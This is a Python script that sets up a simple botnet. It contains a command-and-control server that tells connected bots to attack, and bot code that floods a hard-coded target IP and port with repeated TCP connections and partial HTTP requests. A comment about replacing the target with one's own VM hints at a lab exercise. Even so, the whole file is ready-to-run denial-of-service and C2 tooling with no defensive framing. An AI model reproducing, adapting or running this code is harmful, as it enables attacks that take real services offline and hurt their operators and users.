import socket
import threading
import time

# Configuration
C2_SERVER_IP = '127.0.0.1'  # Use the appropriate IP address
C2_SERVER_PORT = 900
TARGET_IP = '34.149.87.45'  # Replace with your VM's IP running the web server
TARGET_PORT = 80  # Replace with the port your web server is running on

# Function to perform TCP flood attack
def tcp_flood(target_ip, target_port, num_packets):
    for _ in range(num_packets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
        except socket.error:
            pass

# Function to handle communication with the C2 server
def communicate_with_c2():
    c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2_socket.connect((C2_SERVER_IP, C2_SERVER_PORT))
    
    while True:
        command = c2_socket.recv(1024).decode('utf-8')
        if command.startswith("attack"):
            _, num_packets, interval = command.split()
            num_packets = int(num_packets)
            interval = float(interval)
            print(f"Starting TCP flood attack on {TARGET_IP}:{TARGET_PORT} with {num_packets} packets every {interval} seconds")
            threading.Thread(target=tcp_flood, args=(TARGET_IP, TARGET_PORT, num_packets)).start()
            time.sleep(interval)

# Function to handle communication with bots
def handle_bot(bot_socket, num_packets, interval):
    while True:
        command = f"attack {num_packets} {interval}"
        bot_socket.send(command.encode('utf-8'))
        time.sleep(interval)

# Function to start the C2 server
def start_c2_server(num_packets, interval):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((C2_SERVER_IP, C2_SERVER_PORT))
    server_socket.listen(5)
    print(f"C2 server started on {C2_SERVER_IP}:{C2_SERVER_PORT}")

    while True:
        bot_socket, bot_address = server_socket.accept()
        print(f"Bot connected from {bot_address}")
        # Handle the bot in a separate thread
        threading.Thread(target=handle_bot, args=(bot_socket, num_packets, interval)).start()

if __name__ == "__main__":
    role = input("Enter role (bot/server): ").strip().lower()

    if role == "bot":
        communicate_with_c2()
    elif role == "server":
        num_packets = int(input("Enter the number of packets per attack: "))
        interval = float(input("Enter the time interval between attacks (in seconds): "))
        start_c2_server(num_packets, interval)
    else:
        print("Invalid role. Please enter 'bot' or 'server'.")

